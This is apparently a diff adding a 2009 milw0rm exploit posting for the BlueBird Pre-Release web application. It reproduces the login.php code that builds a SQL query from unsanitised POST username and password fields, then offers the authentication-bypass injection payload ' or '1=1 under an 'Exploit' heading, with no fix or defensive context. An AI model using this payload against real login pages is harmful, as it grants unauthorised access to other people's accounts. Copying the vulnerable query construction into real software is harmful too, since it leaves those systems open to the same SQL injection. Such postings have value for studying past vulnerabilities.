@@ -1,0 +1,37 @@
+#########################################################################################
+[0x01] Informations:
+
+Name           : BlueBird Pre-Release
+Download       : http://downloads.sourceforge.net/bluebird/bluebird_pre.zip
+Vulnerability  : Auth Bypass
+Author         : x0r
+Contact        : andry2000@hotmail.it
+Notes          : Proud to be Italian
+#########################################################################################
+[0x02] Bug:
+
+Bugged file is /[path]/login.php
+
+[Code]
+if ( $request == "POST" )
+{
+	$username = $_POST['username'];
+	$passwd = $_POST['passwd'];
+	
+	// Call mysql class
+	$db = new db;
+	$db->connect();
+	$sql = "SELECT * FROM bluebird_users WHERE username='$username' &&
+password='$passwd' ";
+	$check_query = $db->query($sql);
+	$row = mysql_numrows($check_query);
+[/code]
+
+#########################################################################################
+[0x03] Exploit:
+
+Exploit: ' or '1=1
+
+########################################################################################
+
+# milw0rm.com [2009-02-10]
